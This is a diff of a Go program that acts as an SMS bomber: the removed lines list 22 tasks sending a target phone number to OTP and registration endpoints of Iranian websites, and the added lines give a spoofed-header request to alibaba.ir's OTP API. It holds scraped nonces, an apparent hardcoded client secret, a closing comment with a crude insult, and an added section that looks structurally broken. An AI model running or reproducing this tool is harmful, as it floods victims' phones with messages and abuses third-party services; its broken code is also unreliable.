@@ -540,358 +540,56 @@ tasks <- func(c *http.Client) func() {
     }
 }(client)
 ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-// 1. ultraamooz.com (POST, FORM)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("action", "digits_check_mob")
-        formData.Set("countrycode", "+98")
-        formData.Set("mobileNo", formatPhoneWithSpaces(phone))
-        formData.Set("csrf", "a6fd7f4d05")
-        formData.Set("login", "2")
-        formData.Set("username", "monsmain")
-        formData.Set("email", "")
-        formData.Set("captcha", "")
-        formData.Set("captcha_ses", "")
-        formData.Set("digits", "1")
-        formData.Set("json", "1")
-        formData.Set("whatsapp", "0")
-        formData.Set("digits_reg_name", "monsmain")
-        formData.Set("digits_reg_username", "monsmain")
-        formData.Set("digregcode", "+98")
-        formData.Set("digits_reg_mail", formatPhoneWithSpaces(phone))
-        formData.Set("digregscode2", "+98")
-        formData.Set("mobmail2", "")
-        formData.Set("digits_reg_password", "")
-        formData.Set("dig_otp", "")
-        formData.Set("code", "")
-        formData.Set("dig_reg_mail", "")
-        formData.Set("dig_nounce", "a6fd7f4d05")
-        sendFormRequest(c, ctx, "https://ultraamooz.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-    }
-}(client)
+func sendAlibabaRequest(client *http.Client, ctx context.Context, phone string, wg *sync.WaitGroup, ch chan<- int) {
+	defer wg.Done()
 
-// 2. api.pateh.com (JSON)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "mobile": phone,
-        }
-        sendJSONRequest(c, ctx, "https://api.pateh.com/ath/auth/login-or-register", payload, &wg, ch)
-    }
-}(client)
+	// ساخت header ها
+	headers := map[string]string{
+		"Host":            "ws.alibaba.ir",
+		"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0",
+		"Accept":          "application/json, text/plain, */*",
+		"Accept-Language": "en-US,en;q=0.5",
+		"Accept-Encoding": "gzip, deflate, br",
+		"ab-channel":      "WEB,PRODUCTION,CSR,WWW.ALIBABA.IR",
+		"ab-alohomora":    "MTMxOTIzNTI1MjU2NS4yNTEy",
+		"Content-Type":    "application/json;charset=utf-8",
+		"Origin":          "https://www.alibaba.ir",
+		"Connection":      "keep-alive",
+		"Referer":         "https://www.alibaba.ir/hotel",
+	}
 
-// 3. aloghesti.com (POST, FORM)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("login_digt_countrycode", "+98")
-        formData.Set("digits_phone", getPhoneNumberNoZero(phone))
-        formData.Set("action_type", "phone")
-        formData.Set("digits_reg_name", "monsmain")
-        formData.Set("digits_process_register", "1")
-        formData.Set("sms_otp", "")
-        formData.Set("otp_step_1", "1")
-        formData.Set("digits_otp_field", "1")
-        formData.Set("digits", "1")
-        formData.Set("instance_id", "14a99a5919d973c4ac4f811d93cde732")
-        formData.Set("action", "digits_forms_ajax")
-        formData.Set("type", "login")
-        formData.Set("digits_step_1_type", "")
-        formData.Set("digits_step_1_value", "")
-        formData.Set("digits_step_2_type", "")
-        formData.Set("digits_step_2_value", "")
-        formData.Set("digits_step_3_type", "")
-        formData.Set("digits_step_3_value", "")
-        formData.Set("digits_login_email_token", "")
-        formData.Set("digits_redirect_page", "//aloghesti.com/?page=1&redirect_to=https%3A%2F%2Faloghesti.com%2F")
-        formData.Set("digits_form", "b3b7e8ee3b")
-        formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2Faloghesti.com%2F")
-        formData.Set("show_force_title", "1")
-        formData.Set("container", "digits_protected")
-        formData.Set("sub_action", "sms_otp")
-        sendFormRequest(c, ctx, "https://aloghesti.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-    }
-}(client)
+	jsonData := map[string]interface{}{
+		"phoneNumber": "0" + getPhoneNumberNoZero(phone),
+	}
 
-// 4. accounts.khanoumi.com/account/login/init (FORM)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("applicationId", "b92fdd0f-a44d-4fcc-a2db-6d955cce2f5e")
-        formData.Set("loginIdentifier", phone)
-        formData.Set("loginSchemeName", "sms")
-        sendFormRequest(c, ctx, "https://accounts.khanoumi.com/account/login/init", formData, &wg, ch)
-    }
-}(client)
+	data, _ := json.Marshal(jsonData)
+	req, err := http.NewRequestWithContext(ctx, http.MethodPost, "https://ws.alibaba.ir/api/v3/account/mobile/otp", bytes.NewBuffer(data))
+	if err != nil {
+		ch <- http.StatusInternalServerError
+		return
+	}
 
-// 5. api.malltina.com/check-user (JSON)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "username": phone,
-        }
-        sendJSONRequest(c, ctx, "https://api.malltina.com/check-user", payload, &wg, ch)
-    }
-}(client)
+	for k, v := range headers {
+		req.Header.Set(k, v)
+	}
 
-// 6. api.malltina.com/profiles (JSON)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "password": "Monsmain1",
-            "mobile": phone,
-            "sign_up_referral_link": "https://www.google.com/",
-        }
-        sendJSONRequest(c, ctx, "https://api.malltina.com/profiles", payload, &wg, ch)
-    }
-}(client)
+	resp, err := client.Do(req)
+	if err != nil {
+		ch <- http.StatusInternalServerError
+		return
+	}
+	defer resp.Body.Close()
+	ch <- resp.StatusCode
+}
 
-// 7. www.1001kharid.com/wp-admin/admin-ajax.php (FORM)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("digt_countrycode", "+98")
-        formData.Set("phone", formatPhoneWithSpaces(phone))
-        formData.Set("email", "codedbymonsmain@gmail.com")
-        formData.Set("digits_process_register", "1")
-        formData.Set("sms_otp", "")
-        formData.Set("digits_otp_field", "1")
-        formData.Set("instance_id", "d6cb3048bb8d26ad37ff3614aca5af44")
-        formData.Set("optional_data", "optional_data")
-        formData.Set("action", "digits_forms_ajax")
-        formData.Set("type", "register")
-        formData.Set("dig_otp", "otp")
-        formData.Set("digits", "1")
-        formData.Set("digits_redirect_page", "//www.1001kharid.com/?page=2&redirect_to=https%3A%2F%2Fwww.1001kharid.com%2F")
-        formData.Set("digits_form", "4b99e55cbf")
-        formData.Set("_wp_http_referer", "/?login=true&page=2&redirect_to=https%3A%2F%2Fwww.1001kharid.com%2F")
-        formData.Set("container", "digits_protected")
-        formData.Set("sub_action", "sms_otp")
-        sendFormRequest(c, ctx, "https://www.1001kharid.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-    }
-}(client)
 
-// 8. 1000gem.org/livewire/message/login-register (JSON)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "updates": []map[string]interface{}{
-                {
-                    "type": "syncInput",
-                    "payload": map[string]interface{}{
-                        "name": "phone",
-                        "value": phone,
-                        "id": "erab",
-                    },
-                },
-                {
-                    "type": "callMethod",
-                    "payload": map[string]interface{}{
-                        "id": "0k13",
-                        "method": "sendsms",
-                        "params": []string{},
-                    },
-                },
-            },
-        }
-        sendJSONRequest(c, ctx, "https://1000gem.org/livewire/message/login-register", payload, &wg, ch)
-    }
-}(client)
 
-// 9. market-backend.dgshahr.com/shop/user/user_login/ (JSON)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "phone_number": phone,
-        }
-        sendJSONRequest(c, ctx, "https://market-backend.dgshahr.com/shop/user/user_login/", payload, &wg, ch)
-    }
-}(client)
 
-// 10. irani24.ir/signin?do (FORM)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("do", "")
-        formData.Set("user_mobile", phone)
-        formData.Set("confirm_code", "")
-        sendFormRequest(c, ctx, "https://irani24.ir/signin?do", formData, &wg, ch)
-    }
-}(client)
 
-// 11. api.footballi.net/api/v2/user/check (JSON)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "login": phone,
-            "country_code": "+98",
-        }
-        sendJSONRequest(c, ctx, "https://api.footballi.net/api/v2/user/check", payload, &wg, ch)
-    }
-}(client)
+		
 
-// 12. 70kala.ir/wp-admin/admin-ajax.php (FORM)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("login_digt_countrycode", "+98")
-        formData.Set("digits_phone", formatPhoneWithSpaces(phone))
-        formData.Set("action_type", "phone")
-        formData.Set("digits", "1")
-        formData.Set("instance_id", "7b0048080e38e916af365b7a33363096")
-        formData.Set("action", "digits_forms_ajax")
-        formData.Set("type", "login")
-        formData.Set("digits_step_1_type", "")
-        formData.Set("digits_step_1_value", "")
-        formData.Set("digits_step_2_type", "")
-        formData.Set("digits_step_2_value", "")
-        formData.Set("digits_step_3_type", "")
-        formData.Set("digits_step_3_value", "")
-        formData.Set("digits_login_email_token", "")
-        formData.Set("digits_redirect_page", "//70kala.ir/?page=1&redirect_to=https%3A%2F%2F70kala.ir%2F")
-        formData.Set("digits_form", "3057f39e8c")
-        formData.Set("_wp_http_referer", "/?login=true&page=1&redirect_to=https%3A%2F%2F70kala.ir%2F")
-        formData.Set("show_force_title", "1")
-        sendFormRequest(c, ctx, "https://70kala.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-    }
-}(client)
-
-// 13. onlinekala.ir/login?back=my-account (FORM)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("back", "my-account")
-        formData.Set("username", phone)
-        formData.Set("id_customer", "")
-        formData.Set("firstname", "مانس")
-        formData.Set("lastname", "مین")
-        formData.Set("action", "register")
-        formData.Set("ajax", "1")
-        sendFormRequest(c, ctx, "https://www.onlinekala.ir/login?back=my-account", formData, &wg, ch)
-    }
-}(client)
-
-// 14. evanhamrah.com/wp-admin/admin-ajax.php (FORM)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("phone_number", phone)
-        formData.Set("action", "ajax_login_register")
-        formData.Set("wcp_nonce", "290a8a31b9")
-        sendFormRequest(c, ctx, "https://evanhamrah.com/wp-admin/admin-ajax.php", formData, &wg, ch)
-    }
-}(client)
-
-// 15. user.zirbana.com/v2/register (JSON)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "mobile": phone,
-            "client_id": "12",
-            "client_secret": "yKrlLyr4IBxXhZSyvjKZLObsUF8iSGNhtEEcjfIr",
-        }
-        sendJSONRequest(c, ctx, "https://user.zirbana.com/v2/register", payload, &wg, ch)
-    }
-}(client)
-
-// 16. geminja.com/login?type=register (FORM)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        formData := url.Values{}
-        formData.Set("type", "register")
-        formData.Set("regMobile", phone)
-        formData.Set("dlr-register", "ثبت نام")
-        formData.Set("_dlr_mobits", "")
-        formData.Set("register", "")
-        sendFormRequest(c, ctx, "https://geminja.com/login?type=register", formData, &wg, ch)
-    }
-}(client)
-
-// 17. api.arzplus.net/api/v1/accounts/signup/init/ (JSON)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "phone": phone,
-        }
-        sendJSONRequest(c, ctx, "https://api.arzplus.net/api/v1/accounts/signup/init/", payload, &wg, ch)
-    }
-}(client)
-
-// 18. gooshi.online/site/api/v1/user/otp (JSON)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "mobile": phone,
-            "name": "مانس مین",
-            "national_code": "1000000000",
-            "referrer": "گوگل",
-            "return_url": "",
-        }
-        sendJSONRequest(c, ctx, "https://gooshi.online/site/api/v1/user/otp", payload, &wg, ch)
-    }
-}(client)
-
-// 19. vidovin.com/Users/LoginPopup (JSON)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "MobileNo": phone,
-        }
-        sendJSONRequest(c, ctx, "https://www.vidovin.com/Users/LoginPopup", payload, &wg, ch)
-    }
-}(client)
-
-// 20. my.limoome.com/auth/check-mobile (JSON)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "mobileNumber": getPhoneNumberNoZero(phone),
-            "countryId": "1",
-        }
-        sendJSONRequest(c, ctx, "https://my.limoome.com/auth/check-mobile", payload, &wg, ch)
-    }
-}(client)
-
-// 21. my.limoome.com/api/auth/login/otp (JSON)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        payload := map[string]interface{}{
-            "mobileNumber": getPhoneNumberNoZero(phone),
-            "country": "1",
-        }
-        sendJSONRequest(c, ctx, "https://my.limoome.com/api/auth/login/otp", payload, &wg, ch)
-    }
-}(client)
-
-// 22. ws.alibaba.ir/api/v3/account/mobile/otp (JSON + custom header)
-wg.Add(1)
-tasks <- func(c *http.Client) func() {
-    return func() {
-        headers := map[string]string{
-            "Host":            "ws.alibaba.ir",
-            "User-Agent":     *
+		
+	}
 
 	close(tasks)
 
@@ -908,6 +606,3 @@ tasks <- func(c *http.Client) func() {
 		}
 	}
 }
-/* coded by @monsmain
-⚠️note: copy mamnoe.
-❌befahmam copy kardi khahareto migam...*/
